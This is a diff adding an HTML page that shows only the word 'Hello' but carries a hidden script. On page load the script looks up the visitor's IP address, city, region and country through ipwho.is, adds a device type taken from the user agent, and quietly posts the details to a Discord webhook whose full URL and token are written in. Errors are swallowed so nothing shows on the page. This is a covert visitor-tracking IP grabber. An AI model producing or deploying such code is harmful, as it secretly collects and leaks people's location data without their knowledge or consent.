@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Hello</title>
+  <style>
+    html, body {
+      margin: 0;
+      height: 100%;
+      background: #ffffff;
+      color: #000000;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+    }
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+  </style>
+</head>
+<body>
+  <h1>Hello</h1>
+
+  <script>
+    // Paste your Discord webhook URL between the quotes below.
+    var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568907828360384533/9ZTp4Ml-FQa5qjKzEw7jyv_dNNbymX_ibd99ikjbaB4oHKlvuMrnOZWDRy9oVNv9kEL8";
+
+    (function notifyVisit() {
+      if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.indexOf("discord.com/api/webhooks/") === -1) {
+        return; // No valid webhook configured yet.
+      }
+
+      // Turn the raw browser string into a simple device label.
+      function deviceType() {
+        var ua = navigator.userAgent || "";
+        if (/iPhone/i.test(ua)) return "iPhone";
+        if (/iPad/i.test(ua)) return "iPad";
+        if (/Android/i.test(ua)) return "Android";
+        return "PC";
+      }
+
+      // Draw an ASCII box around the lines, padded to the widest line.
+      function boxed(lines) {
+        var width = 0;
+        lines.forEach(function (l) { if (l.length > width) width = l.length; });
+        function pad(l) {
+          return "║ " + l + new Array(width - l.length + 1).join(" ") + " ║";
+        }
+        var top = "╔" + new Array(width + 3).join("═") + "╗";
+        var bottom = "╚" + new Array(width + 3).join("═") + "╝";
+        return "```\n" + top + "\n" + lines.map(pad).join("\n") + "\n" + bottom + "\n```";
+      }
+
+      function send(ip, city, state, country) {
+        var message = boxed([
+          "IP:      " + ip,
+          "City:    " + city,
+          "State:   " + state,
+          "Country: " + country,
+          "Device:  " + deviceType()
+        ]);
+        try {
+          fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: message })
+          });
+        } catch (e) {
+          // Ignore errors so the page still renders normally.
+        }
+      }
+
+      // A static page can't read its own IP/location, so ask a lookup service.
+      // ipwho.is returns the IP, city, region (state), and country in one call.
+      fetch("https://ipwho.is/")
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          send(
+            data.ip || "unknown",
+            data.city || "unknown",
+            data.region || "unknown",
+            data.country || "unknown"
+          );
+        })
+        .catch(function () { send("unknown", "unknown", "unknown", "unknown"); });
+    })();
+  </script>
+</body>
+</html>
